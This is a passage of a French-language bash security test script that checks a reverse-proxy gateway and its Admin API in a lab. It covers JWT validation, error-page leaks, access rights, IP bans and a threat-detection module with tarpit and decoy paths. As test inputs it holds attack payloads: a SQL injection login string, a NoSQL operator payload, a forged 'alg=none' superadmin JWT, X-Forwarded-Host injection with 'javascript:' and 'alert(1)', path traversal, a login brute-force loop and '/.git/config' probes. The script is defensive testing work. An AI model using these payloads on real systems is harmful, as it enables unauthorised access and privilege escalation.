  check "jeton expiré" "$(code -H "Authorization: Bearer $(jwt 'exp=-120')" "$(u jwt)/whoami")" 401
  check "mauvais émetteur (iss)" "$(code -H "Authorization: Bearer $(jwt 'iss=https://evil.test')" "$(u jwt)/whoami")" 401
  check "mauvaise audience (aud)" "$(code -H "Authorization: Bearer $(jwt 'aud=autre-api')" "$(u jwt)/whoami")" 401
  check "jeton illisible" "$(code -H 'Authorization: Bearer abc.def.ghi' "$(u jwt)/whoami")" 401
  check "« Bearer » sans jeton" "$(code -H 'Authorization: Bearer ' "$(u jwt)/whoami")" 401
  check "schéma Basic au lieu de Bearer" "$(code -H 'Authorization: Basic YWRtaW46YWRtaW4=' "$(u jwt)/whoami")" 401
  b=$(curl -s -H "Authorization: Bearer $t" -H 'X-Claims: {"sub":"admin","role":"root"}' "$(u jwt)/echo")
  case "$(echo "$b" | jq -r '.headers["X-Claims"][0] // ""')" in *root*|*admin*) ko "X-Claims forgé par le client transmis au backend";; *) ok "X-Claims forgé par le client écrasé ou retiré ($(echo "$b" | jq -r '.headers["X-Claims"][0] // "absent"' | head -c 60))";; esac
}

t_errleak() { section errleak "Fuites d'information (pages d'erreur, en-têtes)" || return
  local h body
  h=$(mktemp); body=$(curl -s -D "$h" "$(u errleak)/")
  check "backend injoignable → 502" "$(head -1 "$h" | awk '{print $2}')" 502
  # le lien vers l'Admin (GPX_ADMIN_PUBLIC_URL) est traité à part : il porte l'adresse de l'Admin, pas celle d'un backend
  echo "$body" | sed 's/href="[^"]*"//g' | grep -qiE "lab-sim|$SIMH|9009|connection refused|dial tcp|goroutine|panic|\.go:[0-9]+|172\.[0-9]+\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+" && ko "page d'erreur : détails internes exposés ($(echo "$body" | head -c 100))" || ok "page d'erreur sans adresse de backend, port ni trace internes"
  echo "$body" | grep -qiE 'goproxify-admin|component=edge|gpx_page=' && info "la page d'erreur contient un lien vers l'Admin (GPX_ADMIN_PUBLIC_URL ; à vider pour ne pas l'exposer, voir rapport 2026-09-24)"
  grep -qiE '^server: *go|^x-powered-by' "$h" && ko "en-tête révélateur sur la page d'erreur ($(grep -iE '^server|^x-powered' "$h" | head -1))" || ok "pas d'en-tête révélateur sur la page d'erreur"
  body=$(curl -s -H 'Host: inconnu.lab.test' "http://$EDGE_HOST/"); echo "$body" | grep -qiE "lab-sim|$SIMH|172\.[0-9]+\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+" && ko "page d'hôte inconnu : adresse interne exposée" || ok "page d'hôte inconnu sans adresse de backend"
  echo "$body" | grep -qiE 'goproxify-admin|component=edge' && info "la page d'hôte inconnu contient un lien vers l'Admin (GPX_ADMIN_PUBLIC_URL ; à vider pour ne pas l'exposer, voir rapport 2026-09-24)"
  rm -f "$h"
}

t_admin() { section admin "API Admin : accès sans jeton, jetons invalides, injection" || return
  local ep c forged b
  [ -n "${LAB_ADMIN_URL:-}" ] || { skip "LAB_ADMIN_URL absent"; return; }
  for ep in proxies users teams certs nodes settings tokens security/bans security/threats ip-profiles audit logs backups pairing-secret me me/tokens; do
    c=$(curl -s -o /tmp/adm.body -w "%{http_code}" "$LAB_ADMIN_URL/api/v1/$ep"); case "$c:$(head -c1 /tmp/adm.body)" in 2*:{|2*:[) ko "/api/v1/$ep renvoie des données sans jeton ($c)";; *) ok "/api/v1/$ep : aucune donnée sans jeton ($c)";; esac
  done
  check "jeton Bearer invalide" "$(code -H 'Authorization: Bearer garbage' "$LAB_ADMIN_URL/api/v1/proxies")" 401
  forged="$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_').$(printf '{"sub":"1","role":"superadmin","exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')."
  check "JWT alg=none se faisant passer pour superadmin" "$(code -H "Authorization: Bearer $forged" "$LAB_ADMIN_URL/api/v1/proxies")" 401
  check "jeton avec un préfixe de PAT inventé" "$(code -H 'Authorization: Bearer gpx_pat_0000000000000000' "$LAB_ADMIN_URL/api/v1/proxies")" 401
  c=$(code --path-as-is "$LAB_ADMIN_URL/api/v1/../v1/proxies"); not200 "traversal d'API sans jeton" "$c"
  c=$(code -X POST -H 'Content-Type: application/json' -d "{\"email\":\"admin' OR '1'='1\",\"password\":\"x\"}" "$LAB_ADMIN_URL/api/v1/auth/login"); case "$c" in 5*|2*) ko "injection SQL sur le login : $c";; *) ok "injection SQL sur le login rejetée ($c)";; esac
  c=$(code -X POST -H 'Content-Type: application/json' -d '{"email":["a"],"password":{"$ne":1}}' "$LAB_ADMIN_URL/api/v1/auth/login"); case "$c" in 5*|2*) ko "login avec types inattendus : $c";; *) ok "login avec types inattendus rejeté ($c)";; esac
  for ep in / /api/v1/health; do
    b=$(curl -s -D- -o /dev/null --max-time 20 "$LAB_ADMIN_URL$ep" | tr -d '\r')
    echo "$b" | grep -qi '^x-content-type-options: nosniff' && ok "Admin $ep : X-Content-Type-Options: nosniff" || ko "Admin $ep : X-Content-Type-Options absent"
    echo "$b" | grep -qi '^x-frame-options: deny' && ok "Admin $ep : X-Frame-Options: DENY" || ko "Admin $ep : X-Frame-Options absent (clickjacking)"
    echo "$b" | grep -i '^content-security-policy:' | grep -qi "frame-ancestors 'none'" && ok "Admin $ep : CSP frame-ancestors 'none'" || ko "Admin $ep : CSP sans frame-ancestors 'none'"
    echo "$b" | grep -qi '^referrer-policy:' && ok "Admin $ep : Referrer-Policy" || ko "Admin $ep : Referrer-Policy absent"
  done
  curl -s -D- -o /dev/null --max-time 20 "$LAB_ADMIN_URL/api/v1/health" | tr -d '\r' | grep -qi '^cache-control: no-store' && ok "Admin : les réponses de l'API ne sont pas mises en cache" || ko "Admin : Cache-Control: no-store absent sur l'API"
  if [ "${LAB_BRUTE:-0}" = 1 ]; then
    c=$(for i in $(seq 1 25); do code -X POST -H 'Content-Type: application/json' -d "{\"email\":\"inexistant@lab.test\",\"password\":\"mdp$i\"}" "$LAB_ADMIN_URL/api/v1/auth/login"; echo; done | grep -cE '^(429|423)$')
    [ "$c" -ge 1 ] && ok "frein anti brute-force : $c refus 429/423 sur 25 essais" || ko "aucun frein anti brute-force sur 25 essais de login"
  else skip "brute-force du login : LAB_BRUTE=1 pour l'activer (verrouille le compte de test)"; fi
}

acode() { # jeton méthode chemin [corps JSON] -> code HTTP ; réponse dans /tmp/adm.body
  local t=$1 m=$2 p=$3 b=${4:-}
  if [ -n "$b" ]; then curl -s -o /tmp/adm.body -w '%{http_code}' --max-time 20 -X "$m" -H "Authorization: Bearer $t" -H 'Content-Type: application/json' -d "$b" "$LAB_ADMIN_URL$p"
  else curl -s -o /tmp/adm.body -w '%{http_code}' --max-time 20 -X "$m" -H "Authorization: Bearer $t" "$LAB_ADMIN_URL$p"; fi
}
denied() { case "$2" in 401|403) ok "$1 ($2)";; *) ko "$1 : obtenu $2, attendu 401/403";; esac; }
hidden() { case "$2" in 401|403|404) ok "$1 ($2)";; *) ko "$1 : obtenu $2, attendu 401/403/404";; esac; }
nodata() { # description code : refus, ou 200 sans aucune donnée
  local n
  case "$2" in
    401|403) ok "$1 ($2)"; return ;;
    2*) n=$(jq -r 'if type=="array" then length elif type=="object" then ((.entries // .items // []) | length) else 1 end' /tmp/adm.body 2>/dev/null)
        [ "$n" = 0 ] && { ok "$1 : aucune donnée ($2)"; return; } ;;
  esac
  ko "$1 : obtenu $2 avec des données"
}

t_spoof() { section spoof "Usurpation d'IP côté Admin : journal d'audit et allowlist du MCP (poste non fiable : --strict-ip)" || return
  [ -n "${LAB_ADMIN_URL:-}" ] && [ -n "${token:-}" ] || { skip "API Admin ou authentification absente"; return; }
  detect_trust
  if [ $TRUSTED = 1 ]; then skip "le poste de test est un proxy de confiance (réseau privé, GPX_TRUSTED_PROXIES par défaut) : relancer avec run-security.sh --strict-ip"; return; fi
  local email="lab-sec-forge-$(rnd)@lab.test" ip pat pid prev c
  # journal d'audit : l'adresse annoncée par un pair non fiable n'y est pas inscrite
  curl -s -o /dev/null -X POST -H 'Content-Type: application/json' -H 'X-Forwarded-For: 9.9.9.9' \
    -d "$(jq -n --arg e "$email" '{email:$e,password:"mauvais-mot-de-passe"}')" "$LAB_ADMIN_URL/api/v1/auth/login"
  sleep 1
  acode "$token" GET "/api/v1/audit?limit=100" >/dev/null
  ip=$(jq -r --arg e "$email" '[.entries[]? | select(.actor == $e)] | first | .ip // "absent"' /tmp/adm.body)
  case "$ip" in
    absent) skip "échec de connexion de test absent du journal d'audit" ;;
    9.9.9.9*) ko "journal d'audit : l'adresse forgée par le client (9.9.9.9) est inscrite" ;;
    *) ok "journal d'audit : l'adresse annoncée par X-Forwarded-For n'est pas reprise ($ip)" ;;
  esac
  # allowlist du MCP : un X-Forwarded-For forgé ne fait pas passer un pair hors liste
  case "$token" in gpx_pat_*) skip "jeton d'API fourni : créer un PAT exige une session"; return ;; esac
  c=$(acode "$token" POST /api/v1/me/tokens '{"label":"lab-sec-spoof","scopes":["proxies:read"]}')
  [ "$c" = 201 ] || { ko "création du PAT de test : $c"; return; }
  pat=$(jq -r .token /tmp/adm.body); pid=$(jq -r .id /tmp/adm.body)
  acode "$token" GET /api/v1/mcp-access/allowed-ips >/dev/null; prev=$(jq -c '.ips // []' /tmp/adm.body)
  c=$(acode "$pat" POST /mcp '{}'); case "$c" in 401|403) ko "contrôle positif : le MCP refuse le PAT depuis un pair privé de la liste par défaut ($c)";; *) ok "contrôle positif : le MCP répond au PAT depuis un pair privé de la liste par défaut ($c)";; esac
  c=$(acode "$token" PUT /api/v1/mcp-access/allowed-ips '{"ips":["203.0.113.5"]}')
  if [ "$c" = 204 ]; then
    c=$(curl -s -o /dev/null -w '%{http_code}' --max-time 20 -X POST -H "Authorization: Bearer $pat" -H 'Content-Type: application/json' -H 'X-Forwarded-For: 203.0.113.5' -d '{}' "$LAB_ADMIN_URL/mcp")
    denied "MCP : un X-Forwarded-For forgé ne fait pas passer un pair hors de l'allowlist" "$c"
    acode "$token" PUT /api/v1/mcp-access/allowed-ips "{\"ips\":$prev}" >/dev/null
  else ko "réglage de l'allowlist du MCP : $c"; fi
  acode "$token" DELETE "/api/v1/me/tokens/$pid" >/dev/null
}

t_rights() { section rights "Droits de l'API Admin : jeton à portée limitée, compte sans équipe, périmètre d'équipe, élévation de privilèges" || return
  [ -n "${LAB_ADMIN_URL:-}" ] && [ -n "${token:-}" ] || { skip "API Admin ou authentification absente (LAB_ADMIN_TOKEN ou LAB_ADMIN_EMAIL/LAB_ADMIN_PASSWORD)"; return; }
  local pat pid c uid tid email pw ut mine other other_id p
  case "$token" in
    gpx_pat_*) skip "jeton d'API fourni : créer un PAT exige une session (JWT), contrôles de portée ignorés" ;;
    *)
      c=$(acode "$token" POST /api/v1/me/tokens '{"label":"lab-sec-rights","scopes":["proxies:read"]}')
      if [ "$c" != 201 ]; then ko "création d'un PAT proxies:read : $c"; else
        pat=$(jq -r .token /tmp/adm.body); pid=$(jq -r .id /tmp/adm.body)
        check "PAT proxies:read : lecture des proxys" "$(acode "$pat" GET /api/v1/proxies)" 200
        denied "PAT proxies:read : création de proxy refusée" "$(acode "$pat" POST /api/v1/proxies '{}')"
        for p in users security/bans pairing-secret backups; do denied "PAT proxies:read : GET /$p refusé" "$(acode "$pat" GET "/api/v1/$p")"; done
        denied "un PAT ne peut pas créer de PAT" "$(acode "$pat" POST /api/v1/me/tokens '{"label":"x","scopes":["proxies:read"]}')"
        check "scope de PAT inconnu refusé" "$(acode "$token" POST /api/v1/me/tokens '{"label":"x","scopes":["root:all"]}')" 400
        check "révocation du PAT" "$(acode "$token" DELETE "/api/v1/me/tokens/$pid")" 204
        check "PAT révoqué refusé" "$(acode "$pat" GET /api/v1/proxies)" 401
      fi ;;
  esac
  if [ "${LAB_ALLOW_ACCOUNTS:-1}" != 1 ]; then skip "compte et équipe de test : LAB_ALLOW_ACCOUNTS=1 pour les créer dans l'Admin visé (supprimés ensuite)"; return; fi
  email="lab-sec-$(rnd)@lab.test"; pw="Ls-$(openssl rand -hex 10)!"
  c=$(acode "$token" POST /api/v1/users "$(jq -n --arg e "$email" --arg p "$pw" '{email:$e,password:$p,role:"user"}')")
  [ "$c" = 201 ] || { ko "création du compte de test : $c"; return; }
  uid=$(jq -r .id /tmp/adm.body)
  ut=$(curl -s -X POST "$LAB_ADMIN_URL/api/v1/auth/login" -H 'Content-Type: application/json' -d "$(jq -n --arg e "$email" --arg p "$pw" '{email:$e,password:$p}')" | jq -r '.token // empty')
  if [ -z "$ut" ]; then skip "connexion du compte de test impossible (second facteur obligatoire ?)"; acode "$token" DELETE "/api/v1/users/$uid" >/dev/null; return; fi
  # compte « user » sans équipe : rien à voir, rien à modifier
  nodata "sans équipe : proxys" "$(acode "$ut" GET /api/v1/proxies)"
  for p in nodes logs certs audit security/bans; do denied "sans équipe : GET /$p refusé" "$(acode "$ut" GET "/api/v1/$p")"; done
  for p in users teams pairing-secret backups; do denied "compte user : GET /$p réservé aux administrateurs" "$(acode "$ut" GET "/api/v1/$p")"; done
  denied "compte user : création d'un compte admin" "$(acode "$ut" POST /api/v1/users '{"email":"lab-sec-x@lab.test","password":"Ls-Aaaa1111bbbb!","role":"admin"}')"
  denied "compte user : auto-promotion en admin" "$(acode "$ut" PUT "/api/v1/users/$uid" "$(jq -n --arg e "$email" '{email:$e,role:"admin"}')")"
  c=$(acode "$ut" POST /api/v1/proxies '{"config":{"host":"lab-sec-intrus.lab.test","type":"http","backends":[{"url":"http://127.0.0.1:1","weight":1}]}}')
  case "$c" in 401|403) ok "compte user : création de proxy refusée ($c)";; *) ko "compte user : création de proxy non refusée ($c)"; acode "$token" DELETE "/api/v1/proxies/$(jq -r '.id // empty' /tmp/adm.body)" >/dev/null ;; esac
  # le lien Admin des pages d'erreur publiques ne se laisse pas réécrire par un compte, même sans droit (avant l'Agent/Admin qui a
  # supprimé l'apprentissage depuis les sessions, X-Forwarded-Host d'un compte user devenait le lien de toutes les pages d'erreur)
  for p in 'evil.example|https' 'x.example/%0aalert(1)|javascript'; do
    curl -s -o /dev/null -H "Authorization: Bearer $ut" -H "X-Forwarded-Host: ${p%%|*}" -H "X-Forwarded-Proto: ${p##*|}" "$LAB_ADMIN_URL/api/v1/me"
  done
  sleep 6
  body=$(curl -s "$(u errleak)/")
  echo "$body" | grep -qiE 'evil\.example|javascript:|alert\(1\)' && ko "un compte sans droit a réécrit le lien Admin des pages d'erreur publiques" || ok "le lien Admin des pages d'erreur publiques ne vient pas des en-têtes d'une session"
  # équipe avec un accès en lecture sur un seul proxy
  c=$(acode "$token" POST /api/v1/teams '{"name":"lab-sec-equipe"}')
  if [ "$c" = 201 ]; then
    tid=$(jq -r .id /tmp/adm.body)
    acode "$token" POST "/api/v1/teams/$tid/members" "$(jq -n --arg u "$uid" '{user_id:$u}')" >/dev/null
    c=$(acode "$token" POST "/api/v1/teams/$tid/accesses" '{"name":"lab-lecture","perimeter":{"proxy":"lab-sec-plain*"},"levels":{"proxies":"read"},"permissions":[]}')
    if [ "$c" != 201 ]; then ko "création de l'accès d'équipe : $c $(head -c 150 /tmp/adm.body)"; else
      acode "$ut" GET /api/v1/proxies >/dev/null; mine=$(jq -r '[.[].name] | join(",")' /tmp/adm.body)
      check "accès en lecture limité à lab-sec-plain* : seuls ses proxys sont listés" "$mine" lab-sec-plain.lab.test
      other_id=$(acode "$token" GET /api/v1/proxies >/dev/null; jq -r '.[] | select(.name=="lab-sec-acl.lab.test") | .id' /tmp/adm.body)
      mine_id=$(acode "$ut" GET /api/v1/proxies >/dev/null; jq -r '.[0].id // empty' /tmp/adm.body)
      [ -n "$other_id" ] && hidden "proxy hors périmètre : lecture par identifiant" "$(acode "$ut" GET "/api/v1/proxies/$other_id")"
      [ -n "$other_id" ] && denied "proxy hors périmètre : suppression" "$(acode "$ut" DELETE "/api/v1/proxies/$other_id")"
      [ -n "$mine_id" ] && denied "proxy du périmètre en lecture seule : suppression" "$(acode "$ut" DELETE "/api/v1/proxies/$mine_id")"
      denied "accès aux proxys seulement : GET /security/bans refusé" "$(acode "$ut" GET /api/v1/security/bans)"
      denied "accès aux proxys seulement : GET /logs refusé" "$(acode "$ut" GET /api/v1/logs)"
    fi
    check "suppression de l'équipe de test" "$(acode "$token" DELETE "/api/v1/teams/$tid")" 204
  else ko "création de l'équipe de test : $c"; fi
  check "suppression du compte de test" "$(acode "$token" DELETE "/api/v1/users/$uid")" 204
}

t_bans() { section bans "Bans : validation des cibles et application de bout en bout" || return
  [ -n "${LAB_ADMIN_URL:-}" ] && [ -n "${token:-}" ] || { skip "API Admin ou authentification absente"; return; }
  local ip bid c i exp
  for ip in '1.2.3.1-9' 'pas-une-ip' '198.0.0.0/8' '0.0.0.0/0'; do
    c=$(acode "$token" POST /api/v1/security/bans "$(jq -n --arg i "$ip" '{ip:$i,reason:"lab-sec"}')")
    case "$c" in 400|409) ok "ban refusé pour « $ip » ($c)";; *) ko "ban accepté ou erreur inattendue pour « $ip » ($c)"; [ "$c" = 201 ] && acode "$token" DELETE "/api/v1/security/bans/$(jq -r .id /tmp/adm.body)" >/dev/null;; esac
  done
  ip=198.51.100.200
  detect_trust
  if [ $TRUSTED != 1 ]; then skip "ban de bout en bout : il faut pouvoir annoncer une IP par X-Forwarded-For (poste de confiance)"; return; fi
  check "avant le ban : $ip passe" "$(code -H "X-Forwarded-For: $ip" "$(u plain)/whoami")" 200
  exp=$(date -u -d '+10 minutes' +%FT%TZ)
  c=$(acode "$token" POST /api/v1/security/bans "$(jq -n --arg i "$ip" --arg e "$exp" '{ip:$i,reason:"lab-sec",expires_at:$e}')")
  if [ "$c" != 201 ]; then ko "création du ban : $c"; return; fi
  bid=$(jq -r .id /tmp/adm.body)
  c=000; for i in $(seq 1 20); do c=$(code -H "X-Forwarded-For: $ip" "$(u plain)/whoami"); [ "$c" = 403 ] && break; sleep 2; done
  [ "$c" = 403 ] && ok "ban appliqué par la passerelle (403 après ~$((i*2)) s)" || ko "ban non appliqué après 40 s ($c)"
  check "une autre IP n'est pas touchée" "$(code -H 'X-Forwarded-For: 198.51.100.201' "$(u plain)/whoami")" 200
  check "suppression du ban" "$(acode "$token" DELETE "/api/v1/security/bans/$bid")" 204
  c=000; for i in $(seq 1 20); do c=$(code -H "X-Forwarded-For: $ip" "$(u plain)/whoami"); [ "$c" = 200 ] && break; sleep 2; done
  [ "$c" = 200 ] && ok "déban appliqué par la passerelle (200 après ~$((i*2)) s)" || ko "déban non appliqué après 40 s ($c)"
}

t_ephor() { section ephor "Ephor : détection d'un scanner et ban automatique de bout en bout (labo local seulement)" || return
  [ -n "${LAB_ADMIN_URL:-}" ] && [ -n "${token:-}" ] || { skip "API Admin ou authentification absente"; return; }
  if [ "${LAB_TARGET:-0}" = 1 ]; then skip "modifie la configuration globale d'Ephor : réservé au labo local jetable"; return; fi
  detect_trust
  if [ $TRUSTED != 1 ]; then skip "il faut pouvoir annoncer une IP publique par X-Forwarded-For (poste de confiance) : Ephor ne bannit jamais une adresse privée"; return; fi
  local prev c i n got ip1=198.51.100.50 ip2=198.51.100.52 ip3=198.51.100.51 id
  acode "$token" GET /api/v1/security/threat-config >/dev/null; prev=$(cat /tmp/adm.body)
  scan() { # ip -> codes HTTP de 12 requêtes vers des chemins inexistants, séparés par des espaces
    local x out=""; for x in $(seq 1 12); do out="$out $(code -H "X-Forwarded-For: $1" "$(u plain)/inexistant-$x")"; sleep 0.2; done; echo "$out"
  }
  unban() { for id in $(acode "$token" GET "/api/v1/security/bans?ip=$1" >/dev/null; jq -r '.[]?.id' /tmp/adm.body); do acode "$token" DELETE "/api/v1/security/bans/$id" >/dev/null; done; }

  # mode block : 5 erreurs 4xx en 30 s bannissent l'IP, la suivante est refusée
  c=$(acode "$token" PUT /api/v1/security/threat-config '{"enabled":true,"mode":"block","ban_duration":"10m","error_threshold":5,"error_window":"30s"}')
  if [ "$c" != 204 ]; then ko "activation d'Ephor : $c $(head -c 150 /tmp/adm.body)"; return; fi
  sleep 4
  got=$(scan $ip1)
  n=$(echo "$got" | tr ' ' '\n' | grep -c '^403$')
  [ "$n" -ge 5 ] && ok "mode block : le scanner est refusé après ses erreurs 4xx ($n/12 en 403 :$got)" || ko "mode block : aucun ban après 12 erreurs 4xx ($got)"
  acode "$token" GET "/api/v1/security/bans?ip=$ip1" >/dev/null
  case "$(jq -r '.[0].source // ""' /tmp/adm.body)|$(jq -r '.[0].reason // ""' /tmp/adm.body)" in
    threat\|*4xx*) ok "le ban apparaît dans l'Admin, source « threat », motif « $(jq -r '.[0].reason' /tmp/adm.body) »" ;;
    *) ko "ban absent ou inattendu dans l'Admin pour $ip1 : $(jq -c '.[0] // {}' /tmp/adm.body)" ;;
  esac
  check "une autre IP n'est pas touchée" "$(code -H "X-Forwarded-For: $ip3" "$(u plain)/whoami")" 200
  unban $ip1; sleep 4
  check "après le déban l'IP est de nouveau servie" "$(code -H "X-Forwarded-For: $ip1" "$(u plain)/whoami")" 200

  # mode detect : les mêmes erreurs sont comptées sans jamais refuser
  c=$(acode "$token" PUT /api/v1/security/threat-config '{"enabled":true,"mode":"detect","ban_duration":"10m","error_threshold":5,"error_window":"30s"}')
  if [ "$c" = 204 ]; then
    sleep 4; got=$(scan $ip2)
    n=$(echo "$got" | tr ' ' '\n' | grep -c '^403$')
    [ "$n" -eq 0 ] && ok "mode detect : aucune requête refusée malgré les mêmes erreurs" || ko "mode detect : $n requête(s) refusée(s) ($got)"
    unban $ip2
  else ko "passage d'Ephor en mode detect : $c"; fi

  # état d'origine rétabli
  c=$(acode "$token" PUT /api/v1/security/threat-config "$prev"); [ "$c" = 204 ] && ok "configuration d'Ephor rétablie" || ko "configuration d'Ephor non rétablie ($c) : vérifier à la main"
}

# ---- assistants des sections Ephor (tarpit, leurres, défi) : ils règlent la configuration GLOBALE d'Ephor, labo local seulement
EPH_PREV=
metric() { # nom{étiquettes} -> valeur du compteur de la passerelle (0 s'il n'existe pas encore) ; /metrics exige GPX_METRICS_PUBLIC=1
  curl -s --max-time 10 -H 'Host: lab-sec-plain.lab.test' "http://$EDGE_HOST/metrics" | awk -v k="$1" 'index($0, k " ") == 1 { print $2; f = 1 } END { if (!f) print 0 }'
}
delta() { awk -v a="$1" -v b="$2" 'BEGIN { print b - a }'; }
at_least() { awk -v v="$1" -v m="$2" 'BEGIN { exit !(v >= m) }'; }
under() { awk -v v="$1" -v m="$2" 'BEGIN { exit !(v < m) }'; }
timed() { curl -s -o /dev/null -w '%{http_code} %{time_total}' --max-time 30 "$@"; }  # « code durée »
eph_put() { local c; c=$(acode "$token" PUT /api/v1/security/threat-config "$1"); [ "$c" = 204 ] || { ko "configuration d'Ephor refusée : $c $(head -c 160 /tmp/adm.body)"; return 1; }; sleep 5; }
eph_unban() { local ip id; for ip in "$@"; do for id in $(acode "$token" GET "/api/v1/security/bans?ip=$ip" >/dev/null; jq -r '.[]?.id' /tmp/adm.body); do acode "$token" DELETE "/api/v1/security/bans/$id" >/dev/null; done; done; }
eph_restore() { local c; c=$(acode "$token" PUT /api/v1/security/threat-config "$EPH_PREV"); [ "$c" = 204 ] && ok "configuration d'Ephor rétablie" || ko "configuration d'Ephor non rétablie ($c) : vérifier à la main"; }
eph_prepare() { # prérequis communs ; garde la configuration d'origine dans EPH_PREV
  [ -n "${LAB_ADMIN_URL:-}" ] && [ -n "${token:-}" ] || { skip "API Admin ou authentification absente"; return 1; }
  if [ "${LAB_TARGET:-0}" = 1 ]; then skip "modifie la configuration globale d'Ephor : réservé au labo local jetable"; return 1; fi
  detect_trust
  if [ $TRUSTED != 1 ]; then skip "il faut pouvoir annoncer une IP publique par X-Forwarded-For (poste de confiance) : Ephor ne bannit jamais une adresse privée"; return 1; fi
  if ! curl -s -H 'Host: lab-sec-plain.lab.test' "http://$EDGE_HOST/metrics" | grep -q '^gpx_threat_'; then skip "compteurs gpx_threat_* illisibles (GPX_METRICS_PUBLIC=1 sur la passerelle du labo)"; return 1; fi
  acode "$token" GET /api/v1/security/threat-config >/dev/null; EPH_PREV=$(cat /tmp/adm.body)
}

t_tarpit() { section tarpit "Ephor, tarpit : réponse retenue pour une IP bannie, plafond de requêtes retenues (labo local seulement)" || return
  eph_prepare || return
  local a=198.51.100.60 b=198.51.100.61 i r t h0 f0 h1 f1 n fast slow_n
  eph_put '{"enabled":true,"mode":"block","ban_duration":"10m","error_threshold":5,"error_window":"30s","tarpit":{"enabled":true,"delay_ms":2000,"max_concurrent":2}}' || { eph_restore; return; }
  h0=$(metric 'gpx_threat_tarpit_total{result="held"}'); f0=$(metric 'gpx_threat_tarpit_total{result="full"}')

  # 5 erreurs 4xx passent, la 6e déclenche le ban : elle est déjà retenue
  for i in 1 2 3 4 5; do code -H "X-Forwarded-For: $a" "$(u plain)/inexistant-$i" >/dev/null; done
  r=$(timed -H "X-Forwarded-For: $a" "$(u plain)/inexistant-6"); t=${r#* }
  [ "${r%% *}" = 403 ] && at_least "$t" 1.8 && ok "la requête qui déclenche le ban est retenue puis refusée (403 après ${t}s)" || ko "ban non retenu par le tarpit : $r (attendu 403 après ~2 s)"
  r=$(timed -H "X-Forwarded-For: $a" "$(u plain)/whoami"); t=${r#* }
  [ "${r%% *}" = 403 ] && at_least "$t" 1.8 && ok "une IP bannie par Ephor est retenue ${t}s avant le 403" || ko "IP bannie non retenue : $r"

  # plafond : 5 requêtes simultanées, 2 retenues, 3 refusées aussitôt
  rm -f /tmp/tp.*; for i in 1 2 3 4 5; do ( timed -H "X-Forwarded-For: $a" "$(u plain)/whoami" > /tmp/tp.$i ) & done; wait
  n=0; fast=0; for i in 1 2 3 4 5; do t=$(cut -d' ' -f2 /tmp/tp.$i); if at_least "$t" 1.8; then n=$((n+1)); elif under "$t" 0.5; then fast=$((fast+1)); fi; done
  [ "$n" = 2 ] && [ "$fast" = 3 ] && ok "max_concurrent=2 : 2 requêtes retenues, 3 refusées aussitôt" || ko "plafond du tarpit : $n retenues, $fast immédiates sur 5 (attendu 2 et 3)"
  h1=$(metric 'gpx_threat_tarpit_total{result="held"}'); f1=$(metric 'gpx_threat_tarpit_total{result="full"}')
  at_least "$(delta "$h0" "$h1")" 4 && ok "compteur gpx_threat_tarpit_total{held} : +$(delta "$h0" "$h1")" || ko "compteur held : +$(delta "$h0" "$h1") (attendu au moins 4)"
  at_least "$(delta "$f0" "$f1")" 3 && ok "compteur gpx_threat_tarpit_total{full} : +$(delta "$f0" "$f1")" || ko "compteur full : +$(delta "$f0" "$f1") (attendu au moins 3)"

  # un ban manuel n'est pas retenu
  acode "$token" POST /api/v1/security/bans "$(jq -n --arg i "$b" --arg e "$(date -u -d '+10 minutes' +%FT%TZ)" '{ip:$i,reason:"lab-sec tarpit",expires_at:$e}')" >/dev/null
  r=000; for i in $(seq 1 10); do r=$(timed -H "X-Forwarded-For: $b" "$(u plain)/whoami"); [ "${r%% *}" = 403 ] && break; sleep 2; done
  t=${r#* }; [ "${r%% *}" = 403 ] && under "$t" 0.5 && ok "un ban manuel est refusé sans délai (${t}s)" || ko "ban manuel : $r (attendu 403 immédiat)"

  # sans tarpit le refus est immédiat
  eph_put '{"enabled":true,"mode":"block","ban_duration":"10m","error_threshold":5,"error_window":"30s"}' && {
    r=$(timed -H "X-Forwarded-For: $a" "$(u plain)/whoami"); t=${r#* }
    [ "${r%% *}" = 403 ] && under "$t" 0.5 && ok "tarpit désactivé : refus immédiat (${t}s)" || ko "tarpit désactivé : $r (attendu 403 immédiat)"; }
  eph_unban $a $b; eph_restore
}

t_decoys() { section decoys "Ephor, leurres : chemins que l'application n'utilise jamais, détection, ban et garde-fou (labo local seulement)" || return
  eph_prepare || return
  local c=198.51.100.70 d=198.51.100.71 e=198.51.100.72 s0 s1 h0 h1 k0 k1 sig i
  # detect : compté sans effet
  eph_put '{"enabled":true,"mode":"block","ban_duration":"10m","decoys":{"mode":"detect","paths":["/api/v1/admin/"]}}' || { eph_restore; return; }
  s0=$(metric 'gpx_threat_decoy_total{result="shadow"}')
  check "decoys detect : /.git/config est servi par l'application (404), sans effet" "$(code -H "X-Forwarded-For: $c" "$(u plain)/.git/config")" 404
  s1=$(metric 'gpx_threat_decoy_total{result="shadow"}'); [ "$(delta "$s0" "$s1")" = 1 ] && ok "compteur gpx_threat_decoy_total{shadow} : +1" || ko "compteur shadow : +$(delta "$s0" "$s1") (attendu 1)"
  check "decoys detect : l'IP n'est pas bannie" "$(code -H "X-Forwarded-For: $c" "$(u plain)/whoami")" 200

  # block : le leurre bannit aussitôt (8 points, sans score cumulé)
  eph_put '{"enabled":true,"mode":"block","ban_duration":"10m","decoys":{"mode":"block","paths":["/api/v1/admin/"]}}' || { eph_restore; return; }
  h0=$(metric 'gpx_threat_decoy_total{result="hit"}')
  check "decoys block : l'accès à /.git/config est refusé" "$(code -H "X-Forwarded-For: $d" "$(u plain)/.git/config")" 403
  check "decoys block : l'IP est bannie pour la suite" "$(code -H "X-Forwarded-For: $d" "$(u plain)/whoami")" 403
  # la passerelle remonte le ban à l'Admin par lots : quelques secondes avant qu'il y figure
  for i in $(seq 1 10); do
    acode "$token" GET "/api/v1/security/bans?ip=$d" >/dev/null
    sig=$(jq -r '.[0].signals[0] | "\(.name) \(.points) \(.value)"' /tmp/adm.body 2>/dev/null)
    [ "$sig" != "null null null" ] && [ -n "$sig" ] && break; sleep 2
  done
  [ "$sig" = "decoy 8 /.git/config" ] && ok "ban « $(jq -r '.[0].reason' /tmp/adm.body) », signal decoy à 8 points sur /.git/config" || ko "signal du ban inattendu : « $sig »"
